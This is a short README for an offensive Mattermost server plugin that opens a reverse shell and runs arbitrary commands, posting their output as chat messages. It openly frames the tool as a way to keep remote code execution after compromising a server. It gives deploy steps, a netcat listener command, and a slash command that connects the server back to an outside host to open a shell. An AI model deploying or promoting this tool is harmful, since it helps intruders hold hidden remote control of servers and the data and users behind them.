# Mattermost Reverse Shell plugin

This plugin implements a reverse shell as a server plugin. Also, you can execute commands and have the plugin post the stdout, stderr of the command as a message.

## Why?

If you compromise a Mattermost server, this is a fun way to have RCE.

## Running the plugin

```
make && make deploy
```

Then... start a reverse shell listener
```
nc -lvp 1337
```

and connect
```
/shell connect 1.2.3.4 1337
```

Also, you can execute commands on the server! `/shell exec command [args]`
